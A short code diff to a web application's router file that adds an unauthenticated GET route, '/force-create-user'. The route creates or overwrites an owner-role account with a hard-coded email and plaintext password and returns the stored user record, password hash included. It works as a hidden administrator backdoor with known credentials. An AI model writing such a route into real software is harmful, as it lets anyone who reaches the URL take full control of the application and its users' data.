@@ -622,4 +622,24 @@ router.get("/health", (req, res) => {
   res.json({ ok: true });
 });
 
+router.get("/force-create-user", async (req, res) => {
+  const bcrypt = await import("bcryptjs");
+
+  const hash = await bcrypt.default.hash("Atlas123!", 10);
+
+  const user = await User.findOneAndUpdate(
+    { email: "cd@drccompany.com" },
+    {
+      name: "GEMM",
+      email: "cd@drccompany.com",
+      passwordHash: hash,
+      password: hash,
+      role: "owner",
+      status: "active",
+    },
+    { upsert: true, new: true }
+  );
+
+  res.json({ ok: true, user });
+});
 export default router;
